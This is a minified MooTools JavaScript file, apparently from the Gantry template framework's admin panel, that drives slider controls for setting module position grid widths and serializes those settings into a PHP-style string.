var tip;window.sliders={};window.slidersTips={};Array.prototype.compareArrays=function(a){if(!a){return false;}if(this.length!=a.length){return false;}for(var b=0;b<a.length;b++){if(this[b].compareArrays){if(!this[b].compareArrays(a[b])){return false;}else{continue;}}if(this[b]!=a[b]){return false;}}return true;};String.implement({baseConversion:function(c,b){var a=this;if(isNaN(c)||c<2||c>36||isNaN(b)||b<2||b>36){throw (new RangeError("Illegal radix. Radices must be integers between 2 and 36, inclusive."));}a=parseInt(a,c);a=a.toString(b);return a;},hex2dec:function(){if(!isNaN(this.toInt())){return this;}return this.baseConversion(24,10);},dec2hex:function(){return this.baseConversion(10,24);}});var tip;var createTip=function(b){var a=document.id(b);if(a){return a;}a=new Element("div",{id:b}).inject(document.body).set("text","2 | 2 | 2 | 2 | 2 | 2");a.fx=new Fx.Tween(a,{duration:200,link:"cancel"}).set("opacity",0);return a;};var updateTip=function(b){var c=b.RT.blocks,a="";c.each(function(f,e){if(f.style.display!="none"){var d=f.className.split(" ")[1].replace("mini-grid-","");a+=d.hex2dec()+" | ";}});a=a.substring(0,a.length-2);return a;};var updateSlider=function(d,b){var a=d;b=b;a.min=0;a.max=d.RT.list[b].length-1;a.range=a.max-a.min;a.steps=a.max;a.stepSize=Math.abs(a.range)/a.steps;a.stepWidth=Number((a.stepSize*a.full/Math.abs(a.range)).toFixed(4));var c=(a.stepWidth==Infinity)?a.full:a.stepWidth;a.drag.options.grid=c;if(!a.steps){a.drag.detach();}else{a.drag.attach();}d.RT.current=b;};var updateBlocks=function(c,a,b){if(!b){b=0;}var e=c.RT.blocks;var d=c.RT.list[c.RT.current];a=a;e.removeClass("main");e.each(function(k,g){if(g<c.RT.current){e[g].setStyle("display","block");}else{e[g].setStyle("display","none");}var f=c.RT.list[a][Math.round(b,0)].toString();e[g].className="";var h=(a==1)?c.RT.gridSize:f.charAt(g).hex2dec();e[g].addClass("mini-grid").addClass("mini-grid-"+h);var j=e[g].innerHTML;if(j==c.RT.keyName&&(j!="")){e[g].addClass("main");}});};var serializeSettings=function(c,b){var a="";a+="a:1:{i:"+c.RT.gridSize+";";a+="a:"+b.getLength()+":{";b.each(function(f,e){a+="i:"+e+";a:"+f.length+":{";for(i=0,l=f.length;i<l;i++){if(c.RT.type=="custom"){var d=c.RT.store[e][i];a+="s:"+d.length+':"'+d+'";i:'+f[i].hex2dec()+";";}else{a+="i:"+i+";i:"+f[i].hex2dec()+";";}}a+="}";});a+="}}";return a;};var GantryPositions={add:function(e,a,f,g,m,h,j,n,k){var e=document.id(e),d=a.replace(/-/,"_"),c=document.id(a+"-grp").getElement(".position"),b=document.id(a+"-grp").getElement(".knob");if(!window.sliders){window.sliders={};}GantryPositionsTools.setEvent(e,d);window.sliders[d]=new RokSlider(c,b,{offset:5,snap:true,initialize:function(){this.hiddenEl=".$hidden.";this.RT={};this.RT.current=$$("#"+a+"-grp .list .active a")[0].getFirst().innerHTML.toInt();this.RT.list=j;this.RT.keys=n;this.RT.navigation=document.id(a+"-grp").getElement(".list").getChildren();this.RT.blocks=document.id(a+"-grp").getElements(".mini-grid");this.RT.settings={};this.RT.gridSize=f;this.RT.defaults=g;this.RT.keyName=m||"";this.RT.type=h;this.RT.store={};GantryPositionsTools.init.bind(this,[d])();},onComplete:function(){GantryPositionsTools.complete.bind(this,[a,e])();},onDrag:function(o){GantryPositionsTools.drag.bind(this,[o,d])();},onChange:function(o){GantryPositionsTools.change.bind(this,[o])();}});window.sliders[d].RT.navigation[k].fireEvent("click");b.addEvents({mousedown:function(){this.addClass("down");},mouseup:function(){this.removeClass("down");}});GantryPositionsTools.wrapperTip(a,d);}};var GantryPositionsTools={init:function(b){this.options.steps=this.RT.list[this.RT.current].length-1;this.setOptions(this.options);var d=this.RT.current,a=this.RT.navigation,e=this.RT.blocks;var c=this.RT.settings;a.each(function(g,f){c[d]=[];g.addEvent("click",function(k){if(k){new Event(k).stop();}a.removeClass("active");this.addClass("active");updateSlider(window.sliders[b],this.getFirst().getFirst().innerHTML.toInt());var n=window.sliders[b].RT.defaults[window.sliders[b].RT.current][0];if(window.sliders[b].RT.type=="custom"){var o=window.sliders[b].RT.defaults[window.sliders[b].RT.current];var j=window.sliders[b].RT.keys[window.sliders[b].RT.current];var h=[];j.each(function(q,p){if(q.compareArrays(o.keys)){h.push(p);}});var m=window.sliders[b].RT.list[window.sliders[b].RT.current];h.each(function(q,p){if(m[q]==o.values[0]){window.sliders[b].set(q);}});}else{window.sliders[b].set(window.sliders[b].RT.list[window.sliders[b].RT.current].indexOf(n));}});});updateBlocks(this,d);},complete:function(a,e){this.knob.removeClass("down");e.setProperty("value",serializeSettings(this,new Hash(this.RT.settings)));var b="";var d=Math.round(this.step);for(i=0,len=this.RT.current;i<len;i++){b+=this.RT.list[this.RT.current][(isNaN(d)||d<0)?0:d].toString().charAt(i);}if(this.RT.type!="custom"){this.RT.defaults[this.RT.current]=[b];}else{this.RT.defaults[this.RT.current].values=[b];var c=[];for(i=0,l=this.RT.current;i<l;i++){c.push(this.RT.blocks[i].innerHTML);}this.RT.defaults[this.RT.current].keys=c;}},drag:function(c,b){if($type(c)=="array"){b=c[1];c=c[0];}this.element.getFirst().setStyle("width",c+10);var f=this.step;var e=this.RT.list[this.RT.current][Math.round(f,0)],a="";if(!e){return;}e=e.toString();this.RT.settings[this.RT.current]=[];this.RT.store[this.RT.current]=[];for(i=0,len=this.RT.current;i<len;i++){a+=e.charAt(i).hex2dec()+((i==len-1)?"":" | ");if(this.RT.type=="custom"){this.RT.settings[this.RT.current].push(e.charAt(i));this.RT.store[this.RT.current].push(this.RT.keys[this.RT.current][Math.round(f,0)][i]);}else{this.RT.settings[this.RT.current].push(e.charAt(i));}if(this.RT.keys){var d=this.RT.keys[this.RT.current][Math.round(f,0)][i];if(this.RT.type=="custom"){this.RT.blocks[i].set("text",d);}}}if(!tip){tip=createTip("positions-tip");}tip.set("html",a);updateBlocks(window.sliders[b],this.RT.current,f);},change:function(a){if(this.options.snap){a=this.toPosition(this.step);}a=a||0;this.knob.setStyle(this.property,a);this.fireEvent("onDrag",a);},wrapperTip:function(a,b){document.id(a+"-wrapper").addEvents({mouseenter:function(){var c=this.getElement(".mini-container");var d=c.getCoordinates();tip.setStyles({left:d.left+d.width+5,top:d.top-5});tip.set("html",updateTip(window.sliders[b]));tip.fx.start("opacity",1);},mouseleave:function(){tip.fx.start("opacity",0);}});},showMax:function(d,f){var g=document.id(d+"-grp").getParent(".chain");if(!g){return;}g=g.getParent();var c=g.getElement(".chain-toggle input[type=checkbox]");var b=g.getElement(".chain-showmax select");if(!c||!b){return;}var e=document.id(d+"-grp").getElements("ul.list li");var a="toggle"+c.id.replace(/\-/g,"");if(window[a]){window[a].addEvent("change",function(k){var j=b.get("value").toInt();if(!k){e.setStyle("display","inline");b.fireEvent("detach");}else{var h=$$(e.diff(e.slice(0,j),true));e[j-1].fireEvent("click");h.setStyle("display","none");b.fireEvent("attach");}});}b.addEvent("change",function(j){if(!j){j=this.value;}else{j+=1;}var h=$$(e.diff(e.slice(0,j),true));var k=document.id(d+"-grp").getElement("li.active");if(e.indexOf(k)>j-1){e[j-1].fireEvent("click");}e.setStyle("display","inline");h.setStyle("display","none");});if(window[a]){window[a].fireEvent("change",window[a].state);if(window[a].state){b.fireEvent("attach");}}},setEvent:function(b,a){b.addEvent("set",function(j){var d=window.sliders[a].RT;if(!j.contains("{")){j=serialize(j.replace(/\s/g,"").split(","));}j=j.unserialize();if(!j[d.gridSize]){return;}else{j=new Hash(j[d.gridSize]);}var k={};var c={};j.each(function(o,p){k[p]=[];c[p]=[];if(d.type=="custom"){k[p]={};c[p]={};k[p]["keys"]=[];k[p]["values"]=[];c[p]["keys"]=[];c[p]["values"]=[];}$H(o).each(function(q,r){var s=q.toString().dec2hex();if(d.type!="custom"){k[p].push(s);c[p].push(s);}else{k[p]["keys"].push(r);c[p]["keys"].push(r);k[p]["values"].push(s);c[p]["values"].push(s);}});if(d.type!="custom"){c[p]=[c[p].join("")];}else{c[p]["values"]=[c[p]["values"].join("")];}});d.defaults=$merge(d.defaults,c);if(d.type!="custom"){var m=c[d.current];if(m){var h=d.list[d.current].indexOf(m[0])||0;window.sliders[a].set(h).fireEvent("onComplete");}}else{var f=d.defaults[d.current];var n=d.keys[d.current];var e=[];n.each(function(p,o){if(p.compareArrays(f.keys)){e.push(o);}});var g=d.list[d.current];e.each(function(p,o){if(g[p]==f.values[0]){window.sliders[a].set(p);}});}});}};Array.implement({diff:function(a,c){var b=(c)?$A(this):this;for(i=0;i<a.length;i++){if(b.contains(a[i])){b.erase(a[i]);}}return b;}});